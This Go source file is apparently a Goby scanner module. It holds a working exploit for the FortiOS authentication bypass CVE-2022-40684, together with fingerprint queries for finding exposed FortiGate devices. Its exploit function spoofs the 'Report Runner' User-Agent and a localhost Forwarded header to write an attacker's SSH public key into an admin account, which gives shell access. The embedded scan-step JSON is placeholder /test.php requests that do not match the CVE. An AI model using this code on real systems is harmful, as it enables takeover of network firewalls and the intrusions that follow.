package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Fortinet FortiOS User-Agent Authentication Bypass (CVE-2022-40684)",
    "Description": "<p>Fortinet FortiOS is a set of security operating systems dedicated to the FortiGate network security platform from Fortinet. The system provides users with various security functions such as firewall, anti-virus, IPSec/SSLVPN, Web content filtering and anti-spam.</p><p>Fortinet FortiOS has an authentication bypass vulnerability, an attacker can bypass User-Agent: Report Runner and 127.0.0.1 and add the user's SSH password to gain server privileges.</p>",
    "Product": "Fortinet FortiOS",
    "Homepage": "https://www.fortinet.com/products/fortigate/fortios",
    "DisclosureDate": "2022-10-14",
    "Author": "1291904552@qq.com",
    "FofaQuery": "(body=\"str_table.mail_token_msg\" && body=\"FortiToken\") || (body!=\"Array\" && body=\"and crack_kbd_event from jsconsole.js\" && body=\"EXPORT_SYMBOL try_login\" && body=\"Ajax Login\") || title==\"Firewall Notification\" || banner=\"Fortigate Firewall\" || ((header=\"Server: xxxxxxxx-xxxxx\" || banner=\"Server: xxxxxxxx-xxxxx\") && cert=\"Organizational Unit: FortiGate\")||body=\"/api/v2/monitor/web-ui/extend-session\"",
    "GobyQuery": "(body=\"str_table.mail_token_msg\" && body=\"FortiToken\") || (body!=\"Array\" && body=\"and crack_kbd_event from jsconsole.js\" && body=\"EXPORT_SYMBOL try_login\" && body=\"Ajax Login\") || title==\"Firewall Notification\" || banner=\"Fortigate Firewall\" || ((header=\"Server: xxxxxxxx-xxxxx\" || banner=\"Server: xxxxxxxx-xxxxx\") && cert=\"Organizational Unit: FortiGate\")||body=\"/api/v2/monitor/web-ui/extend-session\"",
    "Level": "3",
    "Impact": "<p>Fortinet FortiOS has an authentication bypass vulnerability, an attacker can bypass User-Agent: Report Runner and 127.0.0.1 and add the user's SSH password to gain server privileges.</p>",
    "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website update in time: <a href=\"https://www.fortinet.com/products/fortigate/fortios\">https://www.fortinet.com/products/fortigate/fortios</a></p>",
    "References": [
        "https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "user",
            "type": "input",
            "value": "admin",
            "show": ""
        },
        {
            "name": "ssh-rsa",
            "type": "input",
            "value": "your-id_rsa.pub",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2022-40684"
    ],
    "CNNVD": [
        "CNNVD-202210-347"
    ],
    "CNVD": [],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "Fortinet FortiOS 防火墙 User-Agent 认证绕过漏洞（CVE-2022-40684）",
            "Product": "FORTINET-防火墙",
            "Description": "<p>Fortinet FortiOS是美国飞塔（Fortinet）公司的一套专用于FortiGate网络安全平台上的安全操作系统。该系统为用户提供防火墙、防病毒、IPSec/SSLVPN、Web内容过滤和反垃圾邮件等多种安全功能。<br></p><p>Fortinet FortiOS 存在认证绕过漏洞，攻击者可通过 User-Agent: Report Runner 和127.0.0.1 绕过并添加用户的SSH密码来获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁，请及时关注官网更新：<a href=\"https://www.fortinet.com/products/fortigate/fortios\">https://www.fortinet.com/products/fortigate/fortios</a><br></p>",
            "Impact": "<p>Fortinet FortiOS 存在认证绕过漏洞，攻击者可通过 User-Agent: Report Runner 和127.0.0.1 绕过并添加用户的SSH密码来获取服务器权限。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Fortinet FortiOS User-Agent Authentication Bypass (CVE-2022-40684)",
            "Product": "Fortinet FortiOS",
            "Description": "<p>Fortinet FortiOS is a set of security operating systems dedicated to the FortiGate network security platform from Fortinet. The system provides users with various security functions such as firewall, anti-virus, IPSec/SSLVPN, Web content filtering and anti-spam.<br></p><p>Fortinet FortiOS has an authentication bypass vulnerability, an attacker can bypass User-Agent: Report Runner and 127.0.0.1 and add the user's SSH password to gain server privileges.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website update in time: <a href=\"https://www.fortinet.com/products/fortigate/fortios\">https://www.fortinet.com/products/fortigate/fortios</a><br></p>",
            "Impact": "<p>Fortinet FortiOS has an authentication bypass vulnerability, an attacker can bypass User-Agent: Report Runner and 127.0.0.1 and add the user's SSH password to gain server privileges.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10680"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/api/v2/cmdb/system/admin/admin"
			cfg1 := httpclient.NewRequestConfig("PUT",uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("User-Agent","Report Runner")
			cfg1.Header.Store("Forwarded","for=\"[127.0.0.1]:8000\";by=\"[127.0.0.1]:9000\";")
			cfg1.Header.Store("content-type","application/json")
			cfg1.Data =fmt.Sprintf("{\"ssh-public-key1\":\"\\\"asd\\\"\"}")
			if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp.StatusCode == 500 && strings.Contains(resp.Utf8Html,"Invalid SSH public key.")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			user := ss.Params["user"].(string)
			sshrsa := ss.Params["ssh-rsa"].(string)
			uri1 := "/api/v2/cmdb/system/admin/"+user
			cfg1 := httpclient.NewRequestConfig("PUT",uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("User-Agent","Report Runner")
			cfg1.Header.Store("Forwarded","for=\"[127.0.0.1]:8000\";by=\"[127.0.0.1]:9000\";")
			cfg1.Header.Store("content-type","application/json")
			cfg1.Data =fmt.Sprintf("{\"ssh-public-key1\":\"\\\"%s\\\"\"}",sshrsa)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if strings.Contains(resp.RawBody,"SSH key is good."){
					expResult.Output = "Success! Please Use Your id_rsa to ssh\n\n"+resp.RawBody
					expResult.Success = true
				}else if strings.Contains(resp.RawBody,"Invalid SSH public key."){
					expResult.Output = "Fail! Please Use correct id_rsa.pub to attack\n\n"+resp.RawBody
					expResult.Success = true
				}

			}
			return expResult
		},
	))
}